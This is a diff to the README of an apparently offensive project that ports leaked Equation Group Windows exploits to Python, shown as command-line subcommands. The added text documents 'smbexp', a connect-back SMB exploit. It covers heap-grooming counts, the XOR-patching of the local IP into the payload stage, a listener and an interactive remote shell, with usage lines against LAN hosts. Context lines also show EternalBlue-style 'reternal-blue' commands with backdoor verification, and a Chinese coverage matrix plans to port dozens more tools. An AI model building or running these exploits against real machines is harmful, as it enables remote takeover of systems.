@@ -117,4 +117,54 @@ Dependency-free (stdlib raw SMBv1 client).
 ```bash
 nsa-equation-py reternal-blue 192.168.1.5 -a x64 --verify-backdoor
 nsa-equation-py reternal-blue 192.168.1.5 --groom 400 -o win7
+```### smbexp — Exploiting SMB (12008smbexp) 利用
+
+Python port of `12008smbexp\smbexp.exe` (recovered via IDA Pro, payload bytes
+lifted verbatim from the `.data` section).  A connect-back SMB exploit family
+tool:
+
 ```
+smbexp.exe <TagIp> <BackPort>           # local IP auto-detected
+smbexp.exe <TagIp> <LocalIp> <BackPort> # explicit local IP
+```
+
+Workflow recovered from `_main` (0x401890) / `StartAddress` (0x4014B0) /
+`sub_401400` / `sub_401640` / `sub_401770`:
+
+1. TCP 445, send 106-byte SMB negotiate (`buf_0`, 0x4031A4); the response's
+   qword[108]−qword[116] "uptime hint" drives a defensive
+   `Maybe Blue Screen. Wait For %d Minutes` prompt (1 continue / 2 quit).
+2. Three heap-grooming phases on fresh 445 connections, all reusing the same
+   564-byte SMB packet (`buf_`, 0x403210) with byte[176] = phase 0/1/2:
+   **70 / 86 / 195 connections** (prints `Send packets 1/2/3`).
+3. `sub_401400` XOR-0xFE-patches the local IP into the 322-byte stage
+   (`buf`, 0x403010) at qword offset 0x077, then starts a listener on
+   `<BackPort>`.
+4. Patches the 1197-byte exploit packet (`buf_1`, 0x40344C) at
+   0x3EC/0x3F0 with socket-address bytes, sends it, sleeps 10 s.
+5. On connect-back: prints `L* ExpOk.`, sends the stage, and drops into an
+   interactive shell (`exit\r\n` quits).
+
+```bash
+nsa-equation-py smbexp 192.168.1.11 21            # listener on :21
+nsa-equation-py smbexp 192.168.1.11 21 -l 10.0.0.5 -y
+```
+
+### setourip — SetOurIp.exe 文件复制工具
+
+Python port of `SetOurIp.exe` (LegacyWindowsExploits/Resources/Tools).
+The current build no longer rewrites `127.0.0.1`: it is a thin `CopyFileA`
+wrapper that prints *"File copied (set of IP no longer done with this exe)"*.
+The optional 3rd argument (IP) is parsed but ignored.
+
+```bash
+nsa-equation-py setourip in.bin out.bin
+```
+
+### 覆盖矩阵
+
+`re_project/coverage_matrix.md` 文件对根目录全部 187 个 EXE（153 个唯一 MD5）
+建立了完整覆盖矩阵：16 个子命令已覆盖，剩余分为「DAVE 框架工具」（81 个，
+共享 adfw/posh/tibe/trfo/trch/tucl 协议栈，建议先建统一 DAVE 协议库再逐批
+移植）、「独立自研工具」（oddjob/DSky/Df/Ep/GROK/PC 套件等）与「第三方捆绑
+工具」（nc/rar/reg/sc/wininst 等，不移植）。
